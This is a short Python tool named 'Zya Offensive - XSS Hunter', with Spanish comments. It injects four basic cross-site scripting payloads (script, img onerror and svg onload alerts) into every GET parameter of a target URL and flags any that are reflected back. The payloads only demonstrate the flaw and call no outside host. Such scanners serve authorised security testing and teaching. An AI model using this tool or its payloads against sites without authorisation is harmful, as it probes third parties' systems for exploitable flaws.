#!/usr/bin/env python3
import requests
import urllib.parse
import argparse
from bs4 import BeautifulSoup
from datetime import datetime

# Payloads básicos para XSS
PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(2)</script>",
    "'><img src=x onerror=alert(3)>",
    "<svg/onload=alert(4)>"
]

def test_xss(url):
    print(f"\n[ * ] Probando URL: {url}")
    vulnerable = False
    
    for payload in PAYLOADS:
        # Insertar payload en todos los parámetros
        parsed = list(urllib.parse.urlparse(url))
        query = urllib.parse.parse_qs(parsed[4])
        for param in query:
            query[param] = payload
        
        parsed[4] = urllib.parse.urlencode(query, doseq=True)
        test_url = urllib.parse.urlunparse(parsed)

        try:
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                print(f"[+] Posible XSS encontrado con payload: {payload}")
                vulnerable = True
        except Exception as e:
            print(f"[-] Error en la solicitud: {e}")
    
    if not vulnerable:
        print("[-] No se detectó XSS reflejado con payloads básicos.")
    return vulnerable

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zya Offensive - XSS Hunter")
    parser.add_argument("url", help="URL objetivo con parámetros GET (ejemplo: http://site.com/page.php?id=1)")
    args = parser.parse_args()

    print(f"\n[ * ] Iniciando escaneo XSS")
    print(f"[ * ] Objetivo: {args.url}")
    print(f"[ * ] Hora de inicio: {datetime.now()}")
    test_xss(args.url)
    print(f"\n[ * ] Escaneo finalizado: {datetime.now()}")
